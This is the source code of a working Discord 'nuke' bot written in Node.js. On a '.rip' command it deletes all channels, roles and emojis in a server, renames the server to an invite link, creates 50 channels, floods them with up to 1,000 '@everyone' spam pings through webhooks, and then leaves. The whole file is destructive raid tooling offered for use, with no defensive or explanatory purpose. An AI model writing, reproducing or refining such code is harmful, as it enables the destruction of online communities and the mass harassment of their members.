// ====== LIBRARIES ======
const { Client, GatewayIntentBits } = require('discord.js');
const express = require('express');
const dotenv = require('dotenv');

dotenv.config();

// ====== DISCORD BOT SETUP ======
const client = new Client({
  intents: [
    GatewayIntentBits.Guilds,
    GatewayIntentBits.GuildMessages,
    GatewayIntentBits.MessageContent,
    GatewayIntentBits.GuildWebhooks,
    GatewayIntentBits.GuildEmojisAndStickers
  ]
});

// ====== WEB SERVER FOR PORT 3000 ======
const app = express();
const PORT = process.env.PORT || 3000;

app.get('/', (req, res) => {
  res.send('Nebula Bot is online and awaiting .rip command...');
});

app.listen(PORT, () => {
  console.log(`🌐 Web server running on http://localhost:${PORT}`);
});

// ====== COOLDOWN LOGIC ======
const cooldowns = new Map(); // userId -> timestamp
const cooldownDuration = 10 * 60 * 1000; // 10 minutes in ms

// ====== BOT LOGIC ======
client.on('ready', () => {
  console.log(`Logged in as ${client.user.tag}`);
});

client.on('messageCreate', async (message) => {
  if (message.content === '.rip' && !message.author.bot) {
    const authorId = message.author.id;
    const guild = message.guild;
    const spamMessage = '@everyone Nebula\'s return is here discord.gg/migh';
    let pingCount = 0;
    const maxPings = 1000;

    // Cooldown check
    if (cooldowns.has(authorId)) {
      const expirationTime = cooldowns.get(authorId) + cooldownDuration;
      if (Date.now() < expirationTime) return;
    }
    cooldowns.set(authorId, Date.now());

    // Parallel deletion of all existing content
    await Promise.all([
      guild.channels.cache.map(c => c.delete().catch(() => {})),
      guild.roles.cache
        .filter(r => r.name !== '@everyone' && !r.managed)
        .map(r => r.delete().catch(() => {})),
      guild.emojis.cache.map(e => e.delete().catch(() => {}))
    ]);

    // Rename server
    try {
      await guild.edit({ name: 'discord.gg/migh' });
    } catch {}

    // Create 50 new channels
    const createdChannels = [];
    const createPromises = [];

    for (let i = 0; i < 50; i++) {
      createPromises.push(
        guild.channels.create({ name: 'neb-was-here' }).then(ch => {
          if (ch) createdChannels.push(ch);
        })
      );
    }

    await Promise.all(createPromises);

    // Spam logic
    const spamTasks = [];

    for (const channel of createdChannels) {
      if (pingCount >= maxPings) break;

      spamTasks.push(
        (async () => {
          let webhook;
          try {
            webhook = await channel.createWebhook({
              name: 'Nebula',
              avatar: 'https://i.imgur.com/6QbX6yA.png '
            });
          } catch {
            // Fallback to sending directly
            for (let i = 0; i < Math.min(20, maxPings - pingCount); i++) {
              if (pingCount >= maxPings) break;
              spamTasks.push(channel.send(spamMessage).catch(() => {}));
              pingCount++;
            }
            return;
          }

          for (let i = 0; i < Math.min(20, maxPings - pingCount); i++) {
            if (pingCount >= maxPings) break;
            spamTasks.push(
              webhook.send(spamMessage).catch(async () => {
                try {
                  await channel.send(spamMessage);
                  pingCount++;
                } catch {}
              })
            );
            pingCount++;
          }
        })()
      );
    }

    // Run all spam tasks concurrently
    await Promise.all(spamTasks);

    // Leave server
    try {
      await guild.leave();
    } catch {}

    // DO NOT destroy client
  }
});

// ====== LOGIN ======
client.login(process.env.TOKEN);